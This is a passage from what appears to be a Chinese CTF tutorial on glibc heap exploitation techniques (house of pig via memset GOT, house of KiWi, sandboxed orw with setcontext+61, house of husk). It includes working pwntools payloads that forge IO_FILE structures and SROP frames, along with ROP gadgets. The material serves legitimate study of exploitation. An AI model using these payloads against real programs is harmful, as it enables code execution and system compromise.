
在`2.34`以后，`\_\_free\_hook`，`\_\_malloc\_hook`，`\_\_realloc\_hook`这些函数指针都被删除了，`house of pig`的利用看似也就无法再使用了，但是我们注意到上面源码的注释`4`处，调用了`memset`，在`libc`中也是有`got`表的，并且可写，而这里的`memset`在`IDA`中可以看到是`j\_memset\_ifunc()`，这种都是通过`got`表调用的，因此我们可以把原先`house of pig`的改写`\_\_free\_hook`转为改写`memset`在`libc`中的`got`表。

先在`0xa0`的`tcache`链表头伪造一个`memset\_got\_addr`的地址，并伪造`IO\_FILE`如下：
```python
# magic\_gadget：mov rdx, rbx ; mov rsi, r12 ; call qword ptr [r14 + 0x38]
fake\_stderr = p64(0)\*3 + p64(0xffffffffffffffff) # \_IO\_write\_ptr
fake\_stderr += p64(0) + p64(fake\_stderr\_addr+0xf0) + p64(fake\_stderr\_addr+0x108)
fake\_stderr = fake\_stderr.ljust(0x78, b'\x00')
fake\_stderr += p64(libc.sym['\_IO\_stdfile\_2\_lock']) # \_lock
fake\_stderr = fake\_stderr.ljust(0x90, b'\x00') # srop
fake\_stderr += p64(rop\_address + 0x10) + p64(ret\_addr) # rsp rip
fake\_stderr = fake\_stderr.ljust(0xc8, b'\x00')
fake\_stderr += p64(libc.sym['\_IO\_str\_jumps'] - 0x20)
fake\_stderr += p64(0) + p64(0x21)
fake\_stderr += p64(magic\_gadget) + p64(0) # r14 r14+8
fake\_stderr += p64(0) + p64(0x21) + p64(0)\*3
fake\_stderr += p64(libc.sym['setcontext']+61) # r14 + 0x38
```
这里是通过`house of KiWi`调用的，并且开了沙盒。需要注意的是，在`memset`之前仍然有`free(IO->buf\_base)`，因此需要伪造一下`memset\_got\_addr`的`fake chunk`的堆块头，以及其`next chunk`的堆块头。此外，在`\_\_vfxprintf`中有`\_IO\_flockfile(fp)`，因此`\_lock`也需要修复（任意可写地址即可）。至于各寄存器在`\_IO\_str\_overflow`中最后的情况，最后调试一下就能得到，`magic gadget`也不难找。

### house of KiWi

主要是提供了一种在程序中触发`IO`的思路，恰好又能同时控制`rdx`，很方便地`orw`。
```c
// assert.h
# if defined \_\_cplusplus
# define assert(expr) \
(static\_cast <bool> (expr) \
? void (0) \
: \_\_assert\_fail (#expr, \_\_FILE\_\_, \_\_LINE\_\_, \_\_ASSERT\_FUNCTION))
# elif !defined \_\_GNUC\_\_ || defined \_\_STRICT\_ANSI\_\_
# define assert(expr) \
((expr) \
? \_\_ASSERT\_VOID\_CAST (0) \
: \_\_assert\_fail (#expr, \_\_FILE\_\_, \_\_LINE\_\_, \_\_ASSERT\_FUNCTION))
# else
# define assert(expr) \
((void) sizeof ((expr) ? 1 : 0), \_\_extension\_\_ ({ \
if (expr) \
; /\* empty \*/ \
else \
\_\_assert\_fail (#expr, \_\_FILE\_\_, \_\_LINE\_\_, \_\_ASSERT\_FUNCTION); \
}))
# endif
// malloc.c ( #include <assert.h> )
# define \_\_assert\_fail(assertion, file, line, function) \
\_\_malloc\_assert(assertion, file, line, function)
static void \_\_malloc\_assert (const char \*assertion, const char \*file, unsigned int line, const char \*function)
{
(void) \_\_fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
\_\_progname, \_\_progname[0] ? ": " : "",
file, line,
function ? function : "", function ? ": " : "",
assertion);
fflush (stderr);
abort ();
}
```
可以看到，在`malloc.c`中，`assert`断言失败，最终都会调用`\_\_malloc\_assert`，而其中有一个`fflush (stderr)`的函数调用，会走`stderr`的`IO\_FILE`，最终会调用到其`vtable`中`\_IO\_file\_jumps`中的`\_\_IO\_file\_sync`，此时`rdx`为`IO\_helper\_jumps`。

开了沙盒需要`orw`的题目，经常使用`setcontext`控制`rsp`，进而跳转过去调用`ROP`链，而在`2.29`版本以上`setcontext`中的参数也由`rdi`变为`rdx`了，起始位置也从`setcontext+53`变为了`setcontext+61`（`2.29`版本有些特殊，仍然是`setcontext+53`起始，但是控制的寄存器已经变成了`rdx`），`rdx`显然没有`rdi`好控制，然而`house of KiWi`恰好能帮助我们控制`rdx`。

下面的问题就在于如何触发`assert`的断言出错，通常有以下几种方式：
1.在`\_int\_malloc`中判断到`top chunk`的大小太小，无法再进行分配时，会走到`sysmalloc`中的断言：
```c
assert ((old\_top == initial\_top (av) && old\_size == 0) ||
((unsigned long) (old\_size) >= MINSIZE &&
prev\_inuse (old\_top) &&
((unsigned long) old\_end & (pagesize - 1)) == 0));
```
因此，我们可以将`top chunk`的`size`改小，并置`prev\_inuse`为`0`，当`top chunk`不足分配时，就会触发这个`assert`了。
2.在`\_int\_malloc`中，当堆块从`unsorted bin`转入`largebin list`的时候，也会有一些断言：`assert (chunk\_main\_arena (bck->bk))`，`assert (chunk\_main\_arena (fwd))`等。

再看相关的宏定义：
`#define NON\_MAIN\_ARENA 0x4`
`#define chunk\_main\_arena(p) (((p)->mchunk\_size & NON\_MAIN\_ARENA) == 0)`

对`mchunk\_size`的解释：`mchunk\_size`成员显示的大小并不等价于该`chunk`在内存中的大小，而是当前`chunk`的大小加上`NON\_MAIN\_ARENA`、`IS\_MAPPED`、`PREV\_INUSE`位的值。

因此，`assert (chunk\_main\_arena(...))`就是检测堆块是否来自于`main\_arena`，也可以通过伪造即将放入`largebin list`的`largebin's size`来触发`assert`。

对于`house of KiWi`利用，需要存在一个任意写，通过修改` \_IO\_file\_jumps + 0x60`的`\_IO\_file\_sync`指针为`setcontext+61`，并修改`IO\_helper\_jumps + 0xA0 and 0xA8`分别为`ROP`链的位置和`ret`指令的`gadget`地址即可。

值得一提的是，在`house of KiWi`调用链中，在调用到`\_\_IO\_file\_sync`之前，在`\_\_vfprintf\_internal`中也会调用`IO\_FILE`虚表中的函数，会调用`[vtable] + 0x38`的函数，即`\_IO\_new\_file\_xsputn`，因此我们可以通过改`IO\_FILE`中`vtable`的值，根据偏移来调用其他虚表中的任意函数。

### 高版本下开了沙盒的orw方法

1. 通过`gadget`做到类似于栈迁移的效果，然后走`ROP`链，打`orw`
2. 通过`setcontext + 61`，控制寄存器`rdx`
（1）可以找`gadget`，使`rdi`或其他寄存器与`rdx`之间进行转换
（2）通过改`\_\_malloc\_hook`为`setcontext + 61`，劫持`IO\_FILE`(多是`stdin`)，将`vtable`改成`\_IO\_str\_jumps`的地址，最后通过`exit`，会走到`\_IO\_str\_overflow`函数，其中有`malloc`函数触发`\_\_malloc\_hook`，此时的`rdx`就是`\_IO\_write\_ptr`中的值，所以直接使`\_IO\_write\_ptr = SROP\_addr`即可。
3. `house of KiWi`
4. 其他`IO`的劫持

对于第一种，`svcudp\_reply+26`处有个`gadget`可以实现：
```assembly
<svcudp\_reply+26>: mov rbp,QWORD PTR [rdi+0x48]
<svcudp\_reply+30>: mov rax,QWORD PTR [rbp+0x18]
<svcudp\_reply+34>: lea r13,[rbp+0x10]
<svcudp\_reply+38>: mov DWORD PTR [rbp+0x10],0x0
<svcudp\_reply+45>: mov rdi,r13
<svcudp\_reply+48>: call QWORD PTR [rax+0x28]
```
对于第二种，先来看通过`gadget`进行`rdi`与`rdx`间的转换（最常用）：
```assembly
mov rdx, qword ptr [rdi + 8]
mov qword ptr [rsp], rax
call qword ptr [rdx + 0x20]
```
再看通过改`\_\_malloc\_hook`并劫持`\_IO\_FILE`的方法：
为什么说一般劫持的都是`stdin`的`IO\_FILE`呢？因为`\_\_malloc\_hook`与`stdin`距离是比较近的，可以在劫持`IO\_FILE`的同时，就把`\_\_malloc\_hook`改掉。

可按如下方式构造`payload`：
```python
SROP\_addr = libc\_base + libc.sym['\_IO\_2\_1\_stdin\_'] + 0xe0
payload = p64(0)\*5 + p64(SROP\_addr) # \_IO\_write\_ptr
payload = payload.ljust(0xd8, b'\x00') + p64(libc\_base + get\_IO\_str\_jumps\_offset())
frame = SigreturnFrame()
frame.rdi = 0
frame.rsi = address
frame.rdx = 0x200
frame.rsp = address + 8
frame.rip = libc\_base + libc.sym['read']
payload += bytes(frame)
payload = payload.ljust(0x1f0, b'\x00') + p64(libc\_base + libc.sym['setcontext'] + 61) # \_\_malloc\_hook
```
至于第三种，`house of KiWi`的方式，在上面已经单独介绍过了，就不再多说了。

关于第四点提到的其他`IO`劫持，在之后都会提及，比如`house of banana`，`house of emma`等等。

### house of husk

在用`printf`进行输出时，会根据其格式化字符串，调用不同的输出函数来以不同格式输出结果。但是如果调用呢？自然是需要格式化字符与其输出函数一一对应的索引表的。`glibc`中的`\_\_register\_printf\_function`函数是`\_\_register\_printf\_specifier`函数的封装：
```c
int \_\_register\_printf\_function (int spec, printf\_function converter,
printf\_arginfo\_function arginfo)
{
return \_\_register\_printf\_specifier (spec, converter,
(printf\_arginfo\_size\_function\*) arginfo);
}
```
`\_\_register\_printf\_specifier`函数就是为格式化字符`spec`的格式化输出注册函数：
```c
int \_\_register\_printf\_specifier (int spec, printf\_function converter,
printf\_arginfo\_size\_function arginfo)
{
if (spec < 0 || spec > (int) UCHAR\_MAX)
{
\_\_set\_errno (EINVAL);
return -1;
}
int result = 0;
\_\_libc\_lock\_lock (lock);
if (\_\_printf\_function\_table == NULL)
{
\_\_printf\_arginfo\_table = (printf\_arginfo\_size\_function \*\*)
calloc (UCHAR\_MAX + 1, sizeof (void \*) \* 2);
if (\_\_printf\_arginfo\_table == NULL)
{
result = -1;
goto out;
}
\_\_printf\_function\_table = (printf\_function \*\*)
(\_\_printf\_arginfo\_table + UCHAR\_MAX + 1);
}
// 为格式化字符spec注册函数指针
\_\_printf\_function\_table[spec] = converter;
\_\_printf\_arginfo\_table[spec] = arginfo;
out:
\_\_libc\_lock\_unlock (lock);
return result;
}
```
可以看到，如果格式化字符`spec`超过`0xff`或小于`0`，即`ascii`码不存在，则返回`-1`，如果`\_\_printf\_arginfo\_table`为空就通过`calloc`分配两张索引表，并将地址存到`\_\_printf\_arginfo\_table`以及`\_\_printf\_function\_table`中。两个表空间均为`0x100`，可以为`0-0xff`的每个字符注册一个`函数指针`，且第一个表后面紧接着第二个表。由此，我们有很明显的思路，可以劫持`\_\_printf\_arginfo\_table`和`\_\_printf\_function\_table`为我们伪造的堆块（多用`largebin attack`），进而伪造里面格式化字符所对应的函数指针（要么为`0`，要么有效）。

在`vfprintf`函数中，如果检测到`\_\_printf\_function\_table`不为空，则对于格式化字符不走默认的输出函数，而是调用`printf\_positional`函数，进而可以调用到表中的函数指针：
